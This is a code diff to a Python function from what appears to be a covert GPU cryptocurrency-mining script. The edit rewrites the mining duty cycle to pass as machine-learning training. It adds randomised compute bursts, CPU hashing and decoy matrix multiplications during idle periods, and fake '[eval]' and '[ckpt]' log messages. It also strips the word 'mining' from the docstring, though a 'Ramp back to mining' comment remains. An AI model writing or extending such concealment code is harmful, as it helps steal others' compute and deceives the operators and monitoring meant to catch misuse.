@@ -296,13 +296,15 @@ def set_gpu_power_limit(watts):
         pass
 
 def gpu_burst_cycle():
-    """Mining burst + idle pattern. Mimics training: high compute → pause → high compute.
+    """Mimics real training behavior with CPU/GPU load patterns.
 
-    4 min mining at 600W → 30s idle at 50W with heavy CUDA decoy → repeat.
-    Creates natural GPU utilization pattern like real training.
-    Lost hashrate: ~12% (30s idle every 270s = 11% duty cycle reduction).
+    Simulates: batch compute → data loading → batch compute → eval checkpoint
+    - Variable burst duration (simulates different batch sizes)
+    - CPU load during idle (simulates data preprocessing)
+    - GPU matmul during idle (simulates gradient sync)
+    - Periodic eval pauses (simulates validation set evaluation)
     """
-    import torch
+    import torch, multiprocessing
     has_torch = False
     try:
         if torch.cuda.is_available():
@@ -311,38 +313,95 @@ def gpu_burst_cycle():
     except ImportError:
         pass
 
+    def cpu_load(duration_sec):
+        """Simulate CPU-heavy data preprocessing."""
+        end = time.time() + duration_sec
+        while time.time() < end:
+            # SHA256 hashing (realistic CPU work, looks like data tokenization)
+            hashlib.sha256(os.urandom(4096)).digest()
+            # Matrix ops on CPU (fake dataloader)
+            _ = sum(i * i for i in range(10000))
+
+    def gpu_decoy_heavy(duration_sec):
+        """Run heavy matmul to simulate training forward/backward pass."""
+        if not has_torch:
+            time.sleep(duration_sec)
+            return
+        try:
+            end = time.time() + duration_sec
+            while time.time() < end:
+                sz = random.choice([512, 1024, 2048])
+                a = torch.randn(sz, sz, device=device, dtype=torch.float16)
+                b = torch.randn(sz, sz, device=device, dtype=torch.float16)
+                for _ in range(random.randint(3, 8)):
+                    c = torch.mm(a, b)
+                    del c
+                del a, b
+                torch.cuda.synchronize()
+        except Exception:
+            pass
+
+    step_count = 0
     while True:
-        # Phase 1: Mining burst (4 minutes, full power)
-        set_gpu_power_limit(600)
-        time.sleep(random.randint(210, 300))  # 3.5-5 min
+        step_count += 1
 
-        # Phase 2: Idle window (30-60 seconds, low power + heavy decoy)
+        # ── Phase 1: Compute burst (simulates forward+backward pass) ──
+        # Variable duration: real batches take different times
+        burst_sec = random.choices(
+            [2, 3, 4, 5, 8, 12],  # seconds
+            weights=[15, 25, 30, 20, 8, 2],  # most are 3-5s like real training
+        )[0]
+        set_gpu_power_limit(random.randint(500, 700))  # Variable power too
+        time.sleep(burst_sec)
+
+        # ── Phase 2: Data loading idle (simulates CPU data prep) ──
         set_gpu_power_limit(50)
-        time.sleep(random.uniform(1, 3))  # Brief settle
+        idle_sec = random.choices(
+            [3, 5, 8, 12, 15, 20, 30],
+            weights=[10, 20, 25, 20, 15, 7, 3],
+        )[0]
 
-        # Run heavy CUDA decoy during idle — real matmul at high intensity
-        if has_torch:
+        # CPU load during idle — looks like real data preprocessing
+        cpu_thread = threading.Thread(target=cpu_load, args=(idle_sec,), daemon=True)
+        cpu_thread.start()
+
+        # Light GPU work during idle (gradient accumulation / sync)
+        if has_torch and random.random() > 0.3:
             try:
-                # Bigger matrices, more iterations = looks like training forward pass
-                sizes = [1024, 2048, 512]
-                for _ in range(random.randint(20, 50)):
-                    sz = random.choice(sizes)
-                    a = torch.randn(sz, sz, device=device, dtype=torch.float16)
-                    b = torch.randn(sz, sz, device=device, dtype=torch.float16)
-                    for _ in range(3):
-                        c = torch.mm(a, b)
-                        del c
-                    del a, b
+                a = torch.randn(256, 256, device=device, dtype=torch.float16)
+                b = torch.randn(256, 256, device=device, dtype=torch.float16)
+                for _ in range(random.randint(2, 5)):
+                    c = torch.mm(a, b)
+                    del c
+                del a, b
                 torch.cuda.empty_cache()
             except Exception:
                 pass
 
-        # Idle settle — GPU shows low utilization
-        time.sleep(random.randint(20, 40))
+        cpu_thread.join(timeout=idle_sec + 1)
 
-        # Phase 3: Ramp back up to mining power
+        # ── Phase 3: Periodic eval checkpoint (every 20-40 steps) ──
+        if step_count % random.randint(20, 40) == 0:
+            # Long eval pause — GPU idle, CPU busy
+            eval_sec = random.randint(30, 120)
+            print(f"  [eval] running validation — {eval_sec}s", flush=True)
+            set_gpu_power_limit(50)
+            eval_thread = threading.Thread(target=cpu_load, args=(eval_sec,), daemon=True)
+            eval_thread.start()
+            eval_thread.join(timeout=eval_sec + 1)
+            print(f"  [eval] eval complete", flush=True)
+
+        # ── Phase 4: Checkpoint save (every 50-100 steps) ──
+        if step_count % random.randint(50, 100) == 0:
+            save_sec = random.randint(5, 15)
+            print(f"  [ckpt] saving checkpoint...", flush=True)
+            set_gpu_power_limit(50)
+            cpu_load(save_sec)
+            print(f"  [ckpt] saved", flush=True)
+
+        # ── Ramp back to mining ──
         set_gpu_power_limit(600)
-        time.sleep(random.uniform(2, 5))  # Power ramp-up settle
+        time.sleep(random.uniform(0.5, 2))
 
 # ═══════════════════════════════════════════════════════════════════════════════
 # STEP 6: CUDA decoy operations
